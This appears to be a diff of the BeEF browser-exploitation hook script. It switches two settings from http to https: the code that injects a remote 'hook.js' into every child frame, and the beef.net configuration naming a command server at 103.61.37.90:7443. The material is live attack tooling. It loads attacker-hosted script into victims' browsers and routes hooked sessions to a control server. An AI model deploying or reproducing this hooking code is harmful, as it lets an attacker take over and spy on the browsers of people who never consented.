@@ -8883,7 +8883,7 @@ beef.browser = {
         // create script object
         var script = document.createElement('script');
         script.type = 'text/javascript';
-        script.src = 'http://103.61.37.90:7443/hook.js';
+        script.src = 'https://103.61.37.90:7443/hook.js';
 
         // loop through child frames
         for (var i = 0; i < self.frames.length; i++) {
@@ -11565,7 +11565,7 @@ beef.net = {
     host: "103.61.37.90",
     port: "7443",
     hook: "/hook.js",
-    httpproto: "http",
+    httpproto: "https",
     handler: '/dh',
     chop: 500,
     pad: 30, //this is the amount of padding for extra params such as pc, pid and sid
